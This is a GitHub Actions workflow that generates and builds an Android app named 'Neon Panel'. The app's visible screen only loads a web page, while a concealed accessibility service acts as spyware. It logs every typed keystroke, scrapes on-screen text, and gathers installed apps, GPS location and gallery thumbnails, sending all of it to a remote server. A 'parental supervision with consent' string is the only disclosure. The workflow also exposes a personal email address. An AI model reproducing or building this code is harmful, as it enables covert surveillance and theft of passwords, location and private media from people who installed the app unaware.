name: Build Neon Panel APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/example/neonpanel
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.PREFER_PROJECT); repositories { google(); mavenCentral() } }
          rootProject.name = "NeonPanel"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          cat > app/build.gradle << 'EOF'
          plugins { id 'com.android.application' }
          android {
              namespace 'com.example.neonpanel'
              compileSdk 34
              defaultConfig {
                  applicationId "com.example.neonpanel"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildTypes {
                  release { minifyEnabled false; proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          cat > app/proguard-rules.pro << 'EOF'
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.neonpanel">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.NeonPanel">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".MonitorService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>
              </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/example/neonpanel/MainActivity.java << 'EOF'
          package com.example.neonpanel;

          import android.Manifest;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends AppCompatActivity {
              private WebView webView;
              private static final int REQUEST_GALLERY_PERMISSION = 100;
              private static final int REQUEST_LOCATION_PERMISSION = 200;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  webView = findViewById(R.id.webView);
                  WebSettings ws = webView.getSettings();
                  ws.setJavaScriptEnabled(true);
                  ws.setDomStorageEnabled(true);
                  webView.setWebViewClient(new WebViewClient());
                  webView.loadUrl("https://neon-aim.vercel.app/");

                  requestGalleryPermission();
              }

              private void requestGalleryPermission() {
                  String[] permissions = getGalleryPermissions();
                  if (permissions.length == 0) {
                      requestLocationPermission();
                      return;
                  }
                  ActivityCompat.requestPermissions(this, permissions, REQUEST_GALLERY_PERMISSION);
              }

              private void requestLocationPermission() {
                  String[] permissions = getLocationPermissions();
                  if (permissions.length == 0) {
                      return;
                  }
                  ActivityCompat.requestPermissions(this, permissions, REQUEST_LOCATION_PERMISSION);
              }

              private String[] getGalleryPermissions() {
                  if (Build.VERSION.SDK_INT >= 33) {
                      boolean needImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED;
                      boolean needVideos = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED;
                      if (needImages && needVideos) return new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO};
                      else if (needImages) return new String[]{Manifest.permission.READ_MEDIA_IMAGES};
                      else if (needVideos) return new String[]{Manifest.permission.READ_MEDIA_VIDEO};
                      else return new String[]{};
                  } else {
                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                          return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
                      else return new String[]{};
                  }
              }

              private String[] getLocationPermissions() {
                  boolean needFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
                  boolean needCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED;
                  if (needFine && needCoarse) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};
                  else if (needFine) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION};
                  else if (needCoarse) return new String[]{Manifest.permission.ACCESS_COARSE_LOCATION};
                  else return new String[]{};
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == REQUEST_GALLERY_PERMISSION) {
                      requestLocationPermission();
                  }
              }

              @Override
              public void onBackPressed() {
                  if (webView.canGoBack()) webView.goBack();
                  else super.onBackPressed();
              }
          }
          EOF

          cat > app/src/main/java/com/example/neonpanel/MonitorService.java << 'EOF'
          package com.example.neonpanel;

          import android.accessibilityservice.AccessibilityService;
          import android.Manifest;
          import android.content.ContentResolver;
          import android.content.Context;
          import android.content.SharedPreferences;
          import android.content.pm.ApplicationInfo;
          import android.content.pm.PackageManager;
          import android.database.Cursor;
          import android.graphics.Bitmap;
          import android.location.Location;
          import android.location.LocationListener;
          import android.location.LocationManager;
          import android.media.ThumbnailUtils;
          import android.net.Uri;
          import android.os.BatteryManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.MediaStore;
          import android.provider.Settings;
          import android.util.Base64;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import android.widget.Toast;
          import org.json.JSONArray;
          import org.json.JSONObject;
          import java.io.ByteArrayOutputStream;
          import java.io.File;
          import java.io.FileWriter;
          import java.io.IOException;
          import java.util.ArrayList;
          import java.util.Collections;
          import java.util.Comparator;
          import java.util.List;
          import java.util.UUID;
          import java.util.concurrent.CountDownLatch;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MediaType;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class MonitorService extends AccessibilityService {
              private static final String TAG = "NEON_PANEL";
              private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
              private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
              private static final String PREFS_NAME = "device_prefs";
              private static final String DEVICE_ID_KEY = "device_id";
              private static final String DEVICE_TOKEN_KEY = "device_token";

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(10, TimeUnit.SECONDS)
                      .readTimeout(10, TimeUnit.SECONDS)
                      .build();
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private Thread uiSenderThread, deviceStateThread, galleryPollerThread, gpsRequestThread;
              private String deviceId, deviceToken;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  initDeviceIdentity();
                  startThreads();
                  showToast("Service connected");
              }

              private void showToast(String msg) {
                  mainHandler.post(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
              }

              private void initDeviceIdentity() {
                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                  deviceId = prefs.getString(DEVICE_ID_KEY, null);
                  deviceToken = prefs.getString(DEVICE_TOKEN_KEY, null);
                  if (deviceId == null || deviceId.isEmpty()) {
                      String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                      if (androidId == null || androidId.isEmpty()) androidId = UUID.randomUUID().toString();
                      deviceId = "device-" + androidId;
                      prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply();
                  }
                  if (deviceToken == null || deviceToken.isEmpty()) {
                      deviceToken = UUID.randomUUID().toString();
                      prefs.edit().putString(DEVICE_TOKEN_KEY, deviceToken).apply();
                  }
              }

              private void startThreads() {
                  startUiSender();
                  startDeviceStateSender();
                  startGalleryPoller();
                  startGpsRequestPoller();
              }

              private void startUiSender() {
                  uiSenderThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { sendUiData(); Thread.sleep(2000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Exception e) { e.printStackTrace(); }
                      }
                  });
                  uiSenderThread.setDaemon(true); uiSenderThread.start();
              }

              private void startDeviceStateSender() {
                  deviceStateThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { sendDeviceState(false); Thread.sleep(30000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Exception e) { e.printStackTrace(); }
                      }
                  });
                  deviceStateThread.setDaemon(true); deviceStateThread.start();
              }

              private void startGalleryPoller() {
                  galleryPollerThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { checkGalleryRequest(); Thread.sleep(5000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Exception e) { e.printStackTrace(); }
                      }
                  });
                  galleryPollerThread.setDaemon(true); galleryPollerThread.start();
              }

              private void startGpsRequestPoller() {
                  gpsRequestThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try { checkGpsRequest(); Thread.sleep(5000); }
                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                          catch (Exception e) { e.printStackTrace(); }
                      }
                  });
                  gpsRequestThread.setDaemon(true); gpsRequestThread.start();
              }

              private void checkGalleryRequest() {
                  try {
                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/request?deviceId=" + deviceId).build();
                      Response response = httpClient.newCall(request).execute();
                      if (response.isSuccessful()) {
                          JSONObject obj = new JSONObject(response.body().string());
                          if (obj.optBoolean("requested", false)) {
                              int count = obj.optInt("count", 100);
                              showToast("Gallery request received: " + count);
                              sendDeviceState(false); // sync token
                              fetchAndUploadGallery(count);
                          }
                      }
                  } catch (Exception e) { e.printStackTrace(); }
              }

              private void checkGpsRequest() {
                  try {
                      Request request = new Request.Builder().url(API_BASE + "/api/gps/request?deviceId=" + deviceId).build();
                      Response response = httpClient.newCall(request).execute();
                      if (response.isSuccessful()) {
                          JSONObject obj = new JSONObject(response.body().string());
                          if (obj.optBoolean("requested", false)) {
                              showToast("GPS request received - fetching fresh location");
                              sendDeviceState(true); // force fresh location
                          }
                      }
                  } catch (Exception e) { e.printStackTrace(); }
              }

              private void fetchAndUploadGallery(int maxCount) {
                  try {
                      List<JSONObject> mediaList = new ArrayList<>();
                      ContentResolver resolver = getContentResolver();

                      // === IMAGES ===
                      Uri imageCollection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                      String[] projection = {
                              MediaStore.Images.Media._ID,
                              MediaStore.Images.Media.DISPLAY_NAME,
                              MediaStore.Images.Media.DATE_ADDED,
                              MediaStore.Images.Media.SIZE
                      };
                      String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
                      Cursor cursor = resolver.query(imageCollection, projection, null, null, sortOrder);
                      if (cursor != null) {
                          while (cursor.moveToNext()) {
                              long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                              String filename = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                              long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
                              long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));

                              Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(resolver, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                              String base64 = thumbnailToBase64(thumb);

                              JSONObject media = new JSONObject();
                              media.put("filename", filename);
                              media.put("timestamp", dateAdded * 1000);
                              media.put("size", size);
                              media.put("type", "image");
                              media.put("thumbnailBase64", base64 != null ? base64 : "");
                              mediaList.add(media);
                          }
                          cursor.close();
                      }

                      // === VIDEOS ===
                      Uri videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                      Cursor videoCursor = resolver.query(videoCollection, projection, null, null, sortOrder);
                      if (videoCursor != null) {
                          while (videoCursor.moveToNext()) {
                              long id = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
                              String filename = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                              long dateAdded = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED));
                              long size = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));

                              Bitmap thumb = MediaStore.Video.Thumbnails.getThumbnail(resolver, id, MediaStore.Video.Thumbnails.MINI_KIND, null);
                              String base64 = thumbnailToBase64(thumb);

                              JSONObject media = new JSONObject();
                              media.put("filename", filename);
                              media.put("timestamp", dateAdded * 1000);
                              media.put("size", size);
                              media.put("type", "video");
                              media.put("thumbnailBase64", base64 != null ? base64 : "");
                              mediaList.add(media);
                          }
                          videoCursor.close();
                      }

                      // Sort by timestamp descending (fixed compatibility)
                      Collections.sort(mediaList, new Comparator<JSONObject>() {
                          @Override
                          public int compare(JSONObject a, JSONObject b) {
                              try {
                                  long ta = a.optLong("timestamp", 0);
                                  long tb = b.optLong("timestamp", 0);
                                  return Long.compare(tb, ta);
                              } catch (Exception e) {
                                  return 0;
                              }
                          }
                      });

                      // Limit to maxCount
                      if (mediaList.size() > maxCount) {
                          mediaList = new ArrayList<>(mediaList.subList(0, maxCount));
                      }

                      // === UPLOAD ===
                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("media", new JSONArray(mediaList));

                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/upload").post(body).build();
                      Response response = httpClient.newCall(request).execute();
                      if (response.isSuccessful()) {
                          showToast("Gallery upload success: " + mediaList.size());
                      } else {
                          showToast("Gallery upload failed: " + response.code());
                      }

                  } catch (Exception e) {
                      e.printStackTrace();
                      showToast("Gallery error: " + e.getMessage());
                  }
              }

              private String thumbnailToBase64(Bitmap bitmap) {
                  if (bitmap == null) return null;
                  try {
                      ByteArrayOutputStream baos = new ByteArrayOutputStream();
                      bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                      return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                  } catch (Exception e) { return null; }
              }

              private void sendDeviceState(boolean forceFreshLocation) {
                  try {
                      String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                      int battery = getBatteryLevel();
                      List<InstalledApp> apps = getInstalledApps();
                      JSONArray appsArray = new JSONArray();
                      for (InstalledApp app : apps) {
                          JSONObject obj = new JSONObject();
                          obj.put("name", app.name);
                          obj.put("package", app.packageName);
                          appsArray.put(obj);
                      }
                      LocationResult loc = getCurrentLocation(forceFreshLocation);
                      JSONObject payload = new JSONObject();
                      payload.put("ownerEmail", OWNER_EMAIL);
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("deviceName", deviceName);
                      payload.put("battery", battery);
                      payload.put("installedApps", appsArray);
                      if (loc != null) {
                          payload.put("latitude", loc.latitude);
                          payload.put("longitude", loc.longitude);
                          payload.put("accuracy", loc.accuracy);
                      }
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Exception e) { e.printStackTrace(); }
              }

              private LocationResult getCurrentLocation(boolean forceFresh) {
                  try {
                      LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;

                      if (!forceFresh) {
                          Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                          if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                          if (loc != null) {
                              return new LocationResult(loc.getLatitude(), loc.getLongitude(), loc.hasAccuracy() ? loc.getAccuracy() : 0);
                          }
                      }

                      final CountDownLatch latch = new CountDownLatch(1);
                      final LocationResult result = new LocationResult();
                      LocationListener listener = new LocationListener() {
                          @Override public void onLocationChanged(Location l) {
                              if (l != null) {
                                  result.latitude = l.getLatitude();
                                  result.longitude = l.getLongitude();
                                  result.accuracy = l.hasAccuracy() ? l.getAccuracy() : 0;
                                  latch.countDown();
                              }
                          }
                          @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                          @Override public void onProviderEnabled(String provider) {}
                          @Override public void onProviderDisabled(String provider) {}
                      };

                      lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
                      lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
                      latch.await(15, TimeUnit.SECONDS);
                      if (result.latitude != 0 || result.longitude != 0) return result;
                      return null;
                  } catch (Exception e) { e.printStackTrace(); }
                  return null;
              }

              private static class LocationResult {
                  double latitude, longitude, accuracy;
                  LocationResult() {}
                  LocationResult(double lat, double lng, double acc) {
                      latitude = lat;
                      longitude = lng;
                      accuracy = acc;
                  }
              }

              private int getBatteryLevel() {
                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                  if (bm != null) return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                  return 0;
              }

              private List<InstalledApp> getInstalledApps() {
                  List<InstalledApp> list = new ArrayList<>();
                  PackageManager pm = getPackageManager();
                  for (ApplicationInfo ai : pm.getInstalledApplications(0)) {
                      if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                          list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName));
                      }
                  }
                  return list;
              }

              private void sendKeylog(String text) {
                  new Thread(() -> {
                      try {
                          JSONObject payload = new JSONObject();
                          payload.put("deviceId", deviceId);
                          payload.put("deviceToken", deviceToken);
                          payload.put("text", text);
                          payload.put("timestamp", System.currentTimeMillis());
                          RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                          Request request = new Request.Builder().url(API_BASE + "/api/keylog").post(body).build();
                          httpClient.newCall(request).execute().close();
                      } catch (Exception e) { e.printStackTrace(); }
                  }).start();
              }

              private void sendUiData() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return;
                      String uiText = extractTextFromNode(root);
                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("uiText", uiText);
                      payload.put("timestamp", System.currentTimeMillis());
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/ui").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Exception e) { e.printStackTrace(); }
              }

              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                      if (event.getText() != null && event.getText().size() > 0) {
                          String text = event.getText().get(0).toString();
                          if (!text.isEmpty()) { logToFile(text); sendKeylog(text); }
                      }
                  }
              }

              private String extractTextFromNode(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  if (node.getText() != null) sb.append(node.getText()).append(" | ");
                  if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" | ");
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo child = node.getChild(i);
                      if (child != null) { sb.append(extractTextFromNode(child)); child.recycle(); }
                  }
                  return sb.toString();
              }

              private void logToFile(String data) {
                  try {
                      File dir = new File(getExternalFilesDir(null), "logs");
                      if (!dir.exists()) dir.mkdirs();
                      FileWriter fw = new FileWriter(new File(dir, "keylog.txt"), true);
                      fw.append(data).append("\n");
                      fw.close();
                  } catch (Exception e) { e.printStackTrace(); }
              }

              @Override public void onInterrupt() {}
              @Override public void onDestroy() {
                  super.onDestroy();
                  if (uiSenderThread != null && uiSenderThread.isAlive()) uiSenderThread.interrupt();
                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
                  if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
              }

              private static class InstalledApp { String name, packageName; InstalledApp(String n, String p){name=n;packageName=p;} }
          }
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical">
              <WebView android:id="@+id/webView"
                  android:layout_width="match_parent"
                  android:layout_height="match_parent" />
          </LinearLayout>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Neon Panel</string>
              <string name="accessibility_service_description">This service captures typed text, screen content, device state, installed apps, location and media gallery for parental supervision with consent.</string>
          </resources>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="Theme.NeonPanel" parent="Theme.AppCompat.Light.NoActionBar" />
          </resources>
          EOF

          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
              android:canRetrieveWindowContent="true"
              android:notificationTimeout="100"
              android:description="@string/accessibility_service_description" />
          EOF

      - name: Generate Wrapper and Build
        run: |
          gradle wrapper --gradle-version 8.2
          chmod +x ./gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: neon-panel-debug-apk
          path: app/build/outputs/apk/debug/*.apk
